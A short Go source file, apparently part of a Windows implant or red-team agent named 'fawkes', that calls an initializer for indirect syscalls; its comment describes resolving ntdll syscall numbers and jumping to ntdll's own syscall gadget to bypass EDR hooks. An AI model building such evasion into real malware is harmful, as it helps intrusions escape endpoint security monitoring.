//go:build windows

package main

import "fawkes/pkg/commands"

// initIndirectSyscalls initializes the indirect syscall resolver at startup.
// Resolves Nt* syscall numbers from ntdll's export table and generates stubs
// that jump to ntdll's own syscall;ret gadget for EDR hook bypass.
func initIndirectSyscalls() {
	_ = commands.InitIndirectSyscalls()
}
